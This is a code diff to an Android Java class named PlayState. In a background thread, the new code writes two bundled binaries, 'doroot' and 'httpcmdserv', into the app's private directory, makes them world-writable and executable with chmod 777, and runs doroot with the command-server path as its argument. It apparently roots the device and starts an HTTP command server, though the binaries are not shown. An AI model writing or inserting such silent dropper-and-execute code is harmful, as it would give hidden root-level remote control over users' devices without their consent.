@@ -41,14 +41,47 @@ public class PlayState {
 
         return state;
     }
-    public static void runDaemServer(final Context mAppContext, final InputStream source) {
+
+    public static void copy(final InputStream source, String destFile) {
+
+        try {
+            File daemservBinFile = new File(destFile);
+            daemservBinFile.getParentFile().mkdirs();
+            OutputStream destination = null;
+            destination = new FileOutputStream(daemservBinFile);
+
+            byte[] buffer = new byte[1024];
+            int nread;
+
+            while ((nread = source.read(buffer)) != -1) {
+                if (nread == 0) {
+                    nread = source.read();
+                    if (nread < 0)
+                        break;
+                    destination.write(nread);
+                    continue;
+                }
+                destination.write(buffer, 0, nread);
+            }
+            destination.close();
+
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    public static void runDaemServer(final Context mAppContext, final InputStream doroot, final InputStream httpcmdserv) {
         new Thread(new Runnable() {
             @Override
             public void run() {
                             /*start daem*/
-                String daemserv = "daemserv";
+                String daemserv = "doroot";
 
                 try {
+                    String httpcmdservFilePath = mAppContext.getFilesDir() + "/" + "httpcmdserv";
                     String daemservFilePath = mAppContext.getFilesDir() + "/" +  daemserv;
                     if (PlayState.isCmdlineRuning(daemservFilePath)) {
                         MyLog.d(TAG, daemservFilePath + " runing ...");
@@ -57,28 +90,50 @@ public class PlayState {
                         MyLog.d(TAG, daemservFilePath + " not  runing ..." );
                     }
 
-                    File daemservBinFile = new File(daemservFilePath);
-                    daemservBinFile.getParentFile().mkdirs();
-                    OutputStream destination = new FileOutputStream(daemservBinFile);
+                    copy(doroot, daemservFilePath);
+                    copy(httpcmdserv, httpcmdservFilePath);
 
-                    byte[] buffer = new byte[1024];
-                    int nread;
+//                    File daemservBinFile = new File(daemservFilePath);
+//                    daemservBinFile.getParentFile().mkdirs();
+//                    OutputStream destination = new FileOutputStream(daemservBinFile);
+//
+//                    byte[] buffer = new byte[1024];
+//                    int nread;
+//
+//                    while ((nread = source.read(buffer)) != -1) {
+//                        if (nread == 0) {
+//                            nread = source.read();
+//                            if (nread < 0)
+//                                break;
+//                            destination.write(nread);
+//                            continue;
+//                        }
+//                        destination.write(buffer, 0, nread);
+//                    }
+//                    destination.close();
+//
+//                    File httpcmdservBinFile = new File(httpcmdservFilePath);
+//                    destination = new FileOutputStream(httpcmdservBinFile);
+//
+//                    while ((nread = httpcmdserv.read(buffer)) != -1) {
+//                        if (nread == 0) {
+//                            nread = httpcmdserv.read();
+//                            if (nread < 0)
+//                                break;
+//                            destination.write(nread);
+//                            continue;
+//                        }
+//                        destination.write(buffer, 0, nread);
+//                    }
+//                    destination.close();
+//
+//
 
-                    while ((nread = source.read(buffer)) != -1) {
-                        if (nread == 0) {
-                            nread = source.read();
-                            if (nread < 0)
-                                break;
-                            destination.write(nread);
-                            continue;
-                        }
-                        destination.write(buffer, 0, nread);
-                    }
-                    destination.close();
 
                     Runtime.getRuntime().exec("chmod 777 " + daemservFilePath);
+                    Runtime.getRuntime().exec("chmod 777 " + httpcmdservFilePath);
                     MyLog.d(TAG, "runing "+ daemservFilePath);
-                    Runtime.getRuntime().exec("/system/bin/sh -c " + daemservFilePath, null, null);
+                    Runtime.getRuntime().exec(daemservFilePath + " " +  httpcmdservFilePath, null, null);
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
